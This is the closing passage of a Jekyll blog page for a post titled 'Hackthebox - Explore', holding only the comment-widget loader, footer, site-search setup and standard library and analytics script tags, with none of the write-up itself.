href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Hackthebox - Explore'; this.page.url = '/posts/htb-explore-post/'; this.page.identifier = '/posts/htb-explore-post/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/kabeallu">kabeallu</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
